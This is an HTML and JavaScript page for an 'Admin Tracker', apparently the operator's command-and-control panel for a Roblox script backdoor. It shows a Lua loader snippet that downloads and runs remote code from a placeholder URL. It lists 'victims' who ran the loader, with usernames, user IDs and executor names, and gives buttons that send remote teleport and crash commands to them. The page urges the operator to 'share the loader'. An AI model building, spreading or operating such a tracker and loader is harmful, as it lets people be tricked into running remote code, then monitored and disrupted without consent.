<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☠️ Admin Tracker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0000; color: #ffcccc; font-family: 'Segoe UI', 'Gotham', sans-serif; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 30px; background: linear-gradient(135deg, #1a0000, #0d0000);
            border: 2px solid #cc0000; border-radius: 16px; margin-bottom: 30px;
            box-shadow: 0 0 40px rgba(200, 0, 0, 0.15);
        }
        .header h1 { font-size: 32px; color: #ff0000; text-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
        .header .sub { color: #ff6666; font-size: 14px; }
        .stats { display: flex; gap: 40px; background: rgba(30, 0, 0, 0.6); padding: 12px 30px; border-radius: 12px; border: 1px solid #660000; }
        .stat-item { text-align: center; }
        .stat-item .number { font-size: 28px; font-weight: bold; color: #ff2222; text-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
        .stat-item .label { font-size: 11px; color: #aa6666; text-transform: uppercase; letter-spacing: 1px; }
        .loader-box { background: #0d0000; border: 1px solid #550000; border-radius: 12px; padding: 20px 25px; margin-bottom: 25px; }
        .loader-box .label { color: #ff4444; font-size: 13px; font-weight: bold; margin-bottom: 8px; }
        .loader-box code { display: block; background: #0a0000; color: #ff8888; padding: 12px 16px; border-radius: 8px; font-size: 13px; border-left: 3px solid #ff0000; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
        .list-header { display: flex; padding: 10px 15px; background: #1a0000; border-radius: 10px 10px 0 0; border-bottom: 2px solid #660000; font-weight: bold; font-size: 13px; color: #ff6666; text-transform: uppercase; }
        .list-header span { flex: 1; }
        .list-header .action-col { flex: 0 0 160px; text-align: center; }
        .victim-list { background: #0a0000; border: 1px solid #330000; border-radius: 0 0 12px 12px; max-height: 600px; overflow-y: auto; }
        .victim-list::-webkit-scrollbar { width: 6px; }
        .victim-list::-webkit-scrollbar-thumb { background: #880000; border-radius: 4px; }
        .victim-row { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid #1a0000; transition: background 0.2s; gap: 10px; }
        .victim-row:hover { background: #1a0000; }
        .online-dot { width: 10px; height: 10px; border-radius: 50%; flex: 0 0 10px; background: #00cc00; box-shadow: 0 0 10px rgba(0, 200, 0, 0.4); animation: pulse 1.5s infinite; }
        .online-dot.offline { background: #555; box-shadow: none; animation: none; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
        .name { flex: 2; font-weight: bold; color: #ffcccc; font-size: 14px; }
        .name .userid { color: #886666; font-weight: normal; font-size: 11px; margin-left: 8px; }
        .executor { flex: 1; font-size: 12px; color: #ff9999; background: rgba(100, 0, 0, 0.3); padding: 2px 10px; border-radius: 20px; text-align: center; border: 1px solid #440000; }
        .status { flex: 1; font-size: 12px; color: #ff6666; text-align: center; }
        .actions { flex: 0 0 160px; display: flex; gap: 6px; justify-content: flex-end; }
        .btn { padding: 5px 14px; border: none; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: all 0.2s; text-transform: uppercase; font-family: inherit; }
        .btn-tp { background: #440044; color: #ff88ff; border: 1px solid #880088; }
        .btn-tp:hover { background: #660066; box-shadow: 0 0 20px rgba(200, 0, 200, 0.3); }
        .btn-tp.active { background: #880088; border-color: #cc00cc; box-shadow: 0 0 25px rgba(200, 0, 200, 0.5); }
        .btn-crash { background: #440000; color: #ff6666; border: 1px solid #880000; }
        .btn-crash:hover { background: #660000; box-shadow: 0 0 20px rgba(200, 0, 0, 0.3); }
        .btn-crash.active { background: #880000; border-color: #cc0000; box-shadow: 0 0 25px rgba(200, 0, 0, 0.5); }
        .empty { padding: 40px; text-align: center; color: #664444; font-size: 16px; }
        .footer { margin-top: 30px; text-align: center; color: #442222; font-size: 12px; border-top: 1px solid #1a0000; padding-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div>
            <h1>☠️ ADMIN TRACKER</h1>
            <div class="sub">⚡ Live loader telemetry & remote control</div>
        </div>
        <div class="stats">
            <div class="stat-item"><div class="number" id="onlineCount">0</div><div class="label">ONLINE NOW</div></div>
            <div class="stat-item"><div class="number" id="totalCount">0</div><div class="label">TOTAL CAPTURED</div></div>
            <div class="stat-item"><div class="number" id="sessionCount">200</div><div class="label">SESSIONS SHOWN</div></div>
        </div>
    </div>

    <div class="loader-box">
        <div class="label">📜 YOUR LOADER SNIPPET</div>
        <code id="loaderSnippet">task.spawn(function()
    pcall(function()
        local s = loadstring(game:HttpGet("https://YOUR-WEBSITE-URL.com/loader.lua"))
        if s then
            s()
            print("[Admin] Script loaded")
        end
    end)
end)</code>
    </div>

    <div class="list-header">
        <span style="flex:2;">USER</span>
        <span style="flex:1;">EXECUTOR</span>
        <span style="flex:1;">STATUS</span>
        <span class="action-col">CONTROLS</span>
    </div>
    <div class="victim-list" id="victimList">
        <div class="empty">⏳ Waiting for victims...</div>
    </div>
    <div class="footer">🔴 Admin Panel | All executors supported | <span id="lastUpdate">Updating...</span></div>
</div>

<script>
    const API_BASE = window.location.origin;
    let selectedUserId = null;

    async function fetchVictims() {
        try {
            const res = await fetch(`${API_BASE}/api/victims`);
            return await res.json();
        } catch (e) { console.error('Fetch error:', e); return null; }
    }

    async function sendCommand(userId, command) {
        try {
            await fetch(`${API_BASE}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId, command })
            });
        } catch (e) { console.error('Command error:', e); }
    }

    function renderVictims(data) {
        const list = document.getElementById('victimList');
        document.getElementById('onlineCount').textContent = data?.online || 0;
        document.getElementById('totalCount').textContent = data?.total || 0;
        document.getElementById('sessionCount').textContent = data?.sessions || 200;
        document.getElementById('lastUpdate').textContent = `Updated: ${new Date().toLocaleTimeString()}`;

        if (!data || !data.victims || data.victims.length === 0) {
            list.innerHTML = `<div class="empty">👻 No victims online. Share the loader!</div>`;
            return;
        }

        let html = '';
        const ONLINE_THRESHOLD = 60000;
        for (const v of data.victims) {
            const isOnline = (Date.now() - v.lastSeen) < ONLINE_THRESHOLD;
            const tpActive = v.tpActive || false;
            const crashActive = v.crashActive || false;

            html += `
                <div class="victim-row">
                    <div class="online-dot ${isOnline ? '' : 'offline'}"></div>
                    <div class="name">${v.userName} <span class="userid">(${v.userId})</span></div>
                    <div class="executor">${v.executor || 'Unknown'}</div>
                    <div class="status">${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}</div>
                    <div class="actions">
                        <button class="btn btn-tp ${tpActive ? 'active' : ''}" onclick="toggleTP('${v.userId}', ${!tpActive})">${tpActive ? '🌀 TP OFF' : '🌀 TP ON'}</button>
                        <button class="btn btn-crash ${crashActive ? 'active' : ''}" onclick="toggleCrash('${v.userId}', ${!crashActive})">${crashActive ? '💀 STOP' : '💀 CRASH'}</button>
                    </div>
                </div>
            `;
        }
        list.innerHTML = html;
    }

    async function toggleTP(userId, enable) {
        await sendCommand(userId, enable ? 'tp_start' : 'tp_stop');
        setTimeout(fetchAndRender, 500);
    }
    async function toggleCrash(userId, enable) {
        await sendCommand(userId, enable ? 'crash' : 'stop_crash');
        setTimeout(fetchAndRender, 500);
    }
    async function fetchAndRender() {
        const data = await fetchVictims();
        if (data) renderVictims(data);
    }

    // Auto-refresh every 3 seconds
    fetchAndRender();
    setInterval(fetchAndRender, 3000);
</script>
</body>
</html>
